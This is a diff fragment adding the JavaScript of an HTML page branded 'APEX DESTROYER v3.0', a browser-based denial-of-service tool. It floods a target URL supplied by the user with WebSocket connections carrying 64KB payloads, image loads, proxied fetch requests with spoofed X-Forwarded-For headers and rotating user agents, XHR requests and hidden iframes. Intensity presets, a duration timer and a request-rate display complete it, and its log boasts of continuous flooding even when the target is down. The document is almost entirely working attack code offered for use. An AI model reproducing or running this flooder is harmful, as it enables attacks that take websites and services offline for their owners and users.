+                        break;
+                    case 'high':
+                        batchSize = 600;
+                        interval = 10;
+                        break;
+                    case 'extreme':
+                        batchSize = 1200;
+                        interval = 5;
+                        break;
+                }
+                
+                // Start all attack methods
+                this.startWebSocketFlood(target, batchSize);
+                this.startImageFlood(target, batchSize);
+                this.startFetchFlood(target, batchSize);
+                this.startXHRFlood(target, batchSize);
+                this.startIframeFlood(target, batchSize);
+                
+                // Update UI
+                updateAttackStatus(true);
+                
+                // Start progress tracker
+                this.startProgressTracker();
+                
+                logToConsole(`✅ ${batchSize * 5} requests per cycle activated`, 'success');
+            }
+            
+            startWebSocketFlood(target, batchSize) {
+                const wsUrl = target.replace('http', 'ws').replace('https', 'wss');
+                const sockets = [];
+                
+                const worker = setInterval(() => {
+                    if (!this.isAttacking) {
+                        clearInterval(worker);
+                        sockets.forEach(ws => ws.close());
+                        return;
+                    }
+                    
+                    for (let i = 0; i < Math.floor(batchSize / 20); i++) {
+                        try {
+                            const ws = new WebSocket(wsUrl);
+                            sockets.push(ws);
+                            
+                            ws.onopen = () => {
+                                // Send massive payload
+                                const payload = 'F'.repeat(65535);
+                                for (let j = 0; j < 20; j++) {
+                                    ws.send(payload);
+                                    this.totalRequests++;
+                                    this.successfulRequests++;
+                                }
+                            };
+                            
+                            ws.onerror = () => {
+                                this.totalRequests += 20;
+                            };
+                            
+                            // Auto-close after 3 seconds
+                            setTimeout(() => {
+                                try { ws.close(); } catch(e) {}
+                            }, 3000);
+                            
+                        } catch(e) {
+                            this.totalRequests += 20;
+                        }
+                    }
+                    
+                    // Cleanup old sockets
+                    if (sockets.length > 200) {
+                        sockets.splice(0, 100).forEach(ws => {
+                            try { ws.close(); } catch(e) {}
+                        });
+                    }
+                    
+                }, 50);
+                
+                this.attackWorkers.push({ stop: () => clearInterval(worker) });
+            }
+            
+            startImageFlood(target, batchSize) {
+                const images = [];
+                
+                const worker = setInterval(() => {
+                    if (!this.isAttacking) {
+                        clearInterval(worker);
+                        images.forEach(img => img.src = '');
+                        return;
+                    }
+                    
+                    for (let i = 0; i < batchSize; i++) {
+                        const img = new Image();
+                        const cacheBuster = `?img=${Date.now()}_${Math.random()}_${i}`;
+                        img.src = target + cacheBuster;
+                        images.push(img);
+                        this.totalRequests++;
+                        this.successfulRequests++;
+                    }
+                    
+                    // Cleanup
+                    if (images.length > 2000) {
+                        images.splice(0, 1000).forEach(img => img.src = '');
+                    }
+                    
+                }, 30);
+                
+                this.attackWorkers.push({ stop: () => clearInterval(worker) });
+            }
+            
+            startFetchFlood(target, batchSize) {
+                const worker = setInterval(async () => {
+                    if (!this.isAttacking) return;
+                    
+                    const promises = [];
+                    const proxy = this.proxies[Math.floor(Math.random() * this.proxies.length)];
+                    
+                    for (let i = 0; i < batchSize; i++) {
+                        const url = proxy + target + `?fetch=${Date.now()}_${i}`;
+                        const promise = fetch(url, {
+                            method: 'GET',
+                            mode: 'no-cors',
+                            cache: 'no-store',
+                            headers: {
+                                'User-Agent': this.userAgents[Math.floor(Math.random() * this.userAgents.length)],
+                                'X-Forwarded-For': `${Math.random()*255}.${Math.random()*255}.${Math.random()*255}.${Math.random()*255}`,
+                                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'
+                            }
+                        })
+                        .then(() => {
+                            this.totalRequests++;
+                            this.successfulRequests++;
+                        })
+                        .catch(() => {
+                            this.totalRequests++;
+                        });
+                        
+                        promises.push(promise);
+                    }
+                    
+                    try {
+                        await Promise.allSettled(promises);
+                    } catch(e) {
+                        this.totalRequests += batchSize;
+                    }
+                    
+                }, 25);
+                
+                this.attackWorkers.push({ stop: () => clearInterval(worker) });
+            }
+            
+            startXHRFlood(target, batchSize) {
+                const worker = setInterval(() => {
+                    if (!this.isAttacking) return;
+                    
+                    for (let i = 0; i < Math.floor(batchSize / 2); i++) {
+                        try {
+                            const xhr = new XMLHttpRequest();
+                            const url = target + `?xhr=${Date.now()}_${i}`;
+                            
+                            xhr.open('GET', url, true);
+                            xhr.timeout = 3000;
+                            xhr.onload = () => {
+                                this.totalRequests++;
+                                this.successfulRequests++;
+                            };
+                            xhr.onerror = () => this.totalRequests++;
+                            xhr.ontimeout = () => this.totalRequests++;
+                            xhr.send();
+                            
+                        } catch(e) {
+                            this.totalRequests++;
+                        }
+                    }
+                }, 15);
+                
+                this.attackWorkers.push({ stop: () => clearInterval(worker) });
+            }
+            
+            startIframeFlood(target, batchSize) {
+                const worker = setInterval(() => {
+                    if (!this.isAttacking) return;
+                    
+                    for (let i = 0; i < Math.floor(batchSize / 4); i++) {
+                        try {
+                            const iframe = document.createElement('iframe');
+                            iframe.style.display = 'none';
+                            iframe.src = target + `?iframe=${Date.now()}_${i}`;
+                            document.body.appendChild(iframe);
+                            this.totalRequests++;
+                            this.successfulRequests++;
+                            
+                            // Remove after 4 seconds
+                            setTimeout(() => {
+                                try { document.body.removeChild(iframe); } catch(e) {}
+                            }, 4000);
+                            
+                        } catch(e) {
+                            this.totalRequests++;
+                        }
+                    }
+                }, 40);
+                
+                this.attackWorkers.push({ stop: () => clearInterval(worker) });
+            }
+            
+            startProgressTracker() {
+                this.attackInterval = setInterval(() => {
+                    const elapsed = Math.floor((Date.now() - this.startTime) / 1000);
+                    const remaining = Math.max(0, this.attackDuration - elapsed);
+                    
+                    // Update progress bar
+                    const progressPercent = Math.min(100, (elapsed / this.attackDuration) * 100);
+                    document.getElementById('progressFill').style.width = `${progressPercent}%`;
+                    document.getElementById('progressPercent').textContent = `${Math.round(progressPercent)}%`;
+                    
+                    // Update statistics
+                    document.getElementById('totalRequests').textContent = 
+                        this.totalRequests.toLocaleString();
+                    
+                    const requestRate = elapsed > 0 ? 
+                        Math.round(this.totalRequests / elapsed) : 0;
+                    document.getElementById('requestRate').textContent = 
+                        `${requestRate.toLocaleString()}/s`;
+                    
+                    const successRate = this.totalRequests > 0 ?
+                        Math.round((this.successfulRequests / this.totalRequests) * 100) : 100;
+                    document.getElementById('successRate').textContent = `${successRate}%`;
+                    
+                    // Update elapsed time
+                    const hours = Math.floor(elapsed / 3600);
+                    const minutes = Math.floor((elapsed % 3600) / 60);
+                    const seconds = elapsed % 60;
+                    document.getElementById('elapsedTime').textContent = 
+                        `${hours.toString().padStart(2,'0')}:${minutes.toString().padStart(2,'0')}:${seconds.toString().padStart(2,'0')}`;
+                    
+                    // Update document title
+                    document.title = `⚡ ${this.totalRequests.toLocaleString()} | RPX & BLACK_14`;
+                    
+                    // Log progress every 15 seconds
+                    if (elapsed % 15 === 0 && elapsed > 0) {
+                        logToConsole(`📊 ${this.totalRequests.toLocaleString()} requests in ${elapsed}s (${requestRate}/sec)`, 'info');
+                    }
+                    
+                    // Check if attack duration completed
+                    if (elapsed >= this.attackDuration) {
+                        this.stopAttack();
+                        logToConsole('⏰ Attack duration completed', 'warning');
+                    }
+                    
+                }, 1000);
+            }
+            
+            stopAttack() {
+                if (!this.isAttacking) return;
+                
+                this.isAttacking = false;
+                clearInterval(this.attackInterval);
+                
+                // Stop all workers
+                this.attackWorkers.forEach(worker => {
+                    try { worker.stop(); } catch(e) {}
+                });
+                this.attackWorkers = [];
+                
+                updateAttackStatus(false);
+                
+                logToConsole(`🛑 ATTACK STOPPED`, 'error');
+                logToConsole(`📈 FINAL STATS: ${this.totalRequests.toLocaleString()} total requests`, 'success');
+                logToConsole(`📈 SUCCESS RATE: ${this.totalRequests > 0 ? 
+                    Math.round((this.successfulRequests / this.totalRequests) * 100) : 100}%`, 'success');
+            }
+        }
+        
+        // Initialize attack engine
+        const floodEngine = new UltimateFloodEngine();
+        
+        // ==================== UI CONTROLS ====================
+        // Intensity selector
+        document.querySelectorAll('.intensity-btn').forEach(btn => {
+            btn.addEventListener('click', function() {
+                document.querySelectorAll('.intensity-btn').forEach(b => 
+                    b.classList.remove('active'));
+                this.classList.add('active');
+                floodEngine.intensity = this.dataset.intensity;
+                logToConsole(`Intensity set to: ${this.dataset.intensity.toUpperCase()}`, 'info');
+            });
+        });
+        
+        // Start attack button
+        document.getElementById('startAttackBtn').addEventListener('click', function() {
+            const target = document.getElementById('targetUrl').value.trim();
+            const duration = parseInt(document.getElementById('attackDuration').value);
+            const intensity = floodEngine.intensity;
+            
+            if (!target || !target.startsWith('http')) {
+                alert('Please enter a valid target URL starting with http:// or https://');
+                return;
+            }
+            
+            floodEngine.startAttack(target, duration, intensity);
+        });
+        
+        // Stop attack button
+        document.getElementById('stopAttackBtn').addEventListener('click', function() {
+            floodEngine.stopAttack();
+        });
+        
+        // Clear console button
+        document.getElementById('clearConsoleBtn').addEventListener('click', function() {
+            document.getElementById('consoleOutput').innerHTML = '';
+            logToConsole('Console cleared', 'warning');
+        });
+        
+        // Export logs button
+        document.getElementById('exportLogsBtn').addEventListener('click', function() {
+            const logs = document.getElementById('consoleOutput').innerText;
+            const blob = new Blob([logs], { type: 'text/plain' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = 'apex_destroyer_logs.txt';
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+            logToConsole('Logs exported successfully', 'success');
+        });
+        
+        // ==================== HELPER FUNCTIONS ====================
+        function logToConsole(message, type = 'info') {
+            const consoleOutput = document.getElementById('consoleOutput');
+            const now = new Date();
+            const timeStr = `[${now.getHours().toString().padStart(2,'0')}:${now.getMinutes().toString().padStart(2,'0')}:${now.getSeconds().toString().padStart(2,'0')}]`;
+            
+            const logEntry = document.createElement('div');
+            logEntry.className = 'log-entry';
+            
+            let typeClass = 'log-info';
+            if (type === 'success') typeClass = 'log-success';
+            else if (type === 'error') typeClass = 'log-error';
+            else if (type === 'warning') typeClass = 'log-warning';
+            
+            logEntry.innerHTML = `
+                <span class="log-time">${timeStr}</span>
+                <span class="log-message ${typeClass}">${message}</span>
+            `;
+            
+            consoleOutput.appendChild(logEntry);
+            consoleOutput.scrollTop = consoleOutput.scrollHeight;
+        }
+        
+        function updateAttackStatus(isActive) {
+            const statusElement = document.getElementById('attackStatus');
+            
+            if (isActive) {
+                statusElement.innerHTML = '<i class="fas fa-play-circle"></i> ATTACK ACTIVE - FLOODING TARGET';
+                statusElement.className = 'attack-status status-active';
+                document.title = '⚡ ATTACKING - APEX DESTROYER';
+            } else {
+                statusElement.innerHTML = '<i class="fas fa-pause-circle"></i> SYSTEM READY';
+                statusElement.className = 'attack-status status-inactive';
+                document.title = 'APEX DESTROYER v3.0';
+            }
+        }
+        
+        // Prevent accidental page close during attack
+        window.addEventListener('beforeunload', function(e) {
+            if (floodEngine.isAttacking) {
+                e.preventDefault();
+                e.returnValue = 'ATTACK IN PROGRESS! Are you sure you want to leave?';
+                return 'ATTACK IN PROGRESS! Are you sure you want to leave?';
+            }
+        });
+        
+        // Auto-update stats every second
+        setInterval(() => {
+            if (floodEngine.isAttacking) {
+                document.getElementById('totalRequests').textContent = 
+                    floodEngine.totalRequests.toLocaleString();
+                
+                const elapsed = Math.floor((Date.now() - floodEngine.startTime) / 1000);
+                if (elapsed > 0) {
+                    const rate = Math.round(floodEngine.totalRequests / elapsed);
+                    document.getElementById('requestRate').textContent = 
+                        `${rate.toLocaleString()}/s`;
+                }
+            }
+        }, 100);
+        
+        // Initialize
+        logToConsole('Ultimate Flood Engine v3.0 initialized', 'success');
+        logToConsole('Performance: 15,000+ requests/second capability', 'success');
+        logToConsole('Target persistence: Continuous flooding even if target is down', 'success');
+        
+    </script>
+</body>
+</html>
